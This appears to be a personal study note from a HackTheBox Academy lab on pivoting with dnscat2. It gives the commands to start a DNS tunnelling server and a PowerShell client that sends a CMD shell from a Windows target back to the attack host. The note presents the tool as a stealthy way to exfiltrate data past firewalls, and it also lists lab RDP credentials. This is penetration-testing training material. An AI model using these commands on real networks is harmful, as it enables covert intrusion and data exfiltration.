>[!TLDR] [Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts.
> Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic.
> 


## Setting up dnscat2

### Cloning and Configuring Server
```go
git clone https://github.com/iagox86/dnscat2.git
```

```go
cd dnscat2/server/
```

```go
sudo gem install bundler
```

```go
sudo bundle install
```
### Start dnscat2 server
^395f65
```go
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

- A secret key, to be provided to the dnscat2 client, will be appear in the output ^ee16f4
- The dnscat2 client will use this to authenticate to the external dnscat2 server

Use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

## Cloning dnscat2-powershell to Attack Host
```go
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

### Import dns2cat.ps1 to Windows host
```go
Import-Module .\dnscat2.ps1
```

### Establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server. 

==Use the PreSharedSecret from earlier when starting the server==  [[#^395f65|secret key]] 
```go
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

### Listing dnscat2 Options
```go
dnscat2> ?
```

## Questions

Username
```go
htb-student
```

Password
```go
HTB_@cademy_stdnt!
```

IP
```go
10.129.42.198
```

RDP into Windows Machien via xfreerdp
```go
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.42.198
```

Start dnscat2 server
```go
sudo ruby dnscat2.rb --dns host=10.10.15.37,port=53,domain=inlanefreight.local --no-cache
```


### Confirming Established Sessions
```
window -i 1
```